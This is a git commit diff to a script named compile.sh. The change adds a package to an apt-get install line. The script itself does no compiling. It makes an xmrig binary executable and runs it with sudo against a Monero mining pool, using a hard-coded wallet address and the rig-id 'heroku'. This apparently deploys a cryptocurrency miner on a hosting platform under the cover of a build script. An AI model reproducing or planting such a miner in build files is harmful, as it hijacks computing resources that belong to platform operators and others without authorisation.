07fb73ef6bad179b53da5204189434138c741864
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:54:39 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,5 +1,5 @@
 echo "install deps"
-sudo apt-get update -y &&sudo apt-get install libhwloc-dev libc6 -y
+sudo apt-get update -y &&sudo apt-get install libhwloc-dev libc6 libc-bin -y
 
 chmod 755 xmrig
 sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
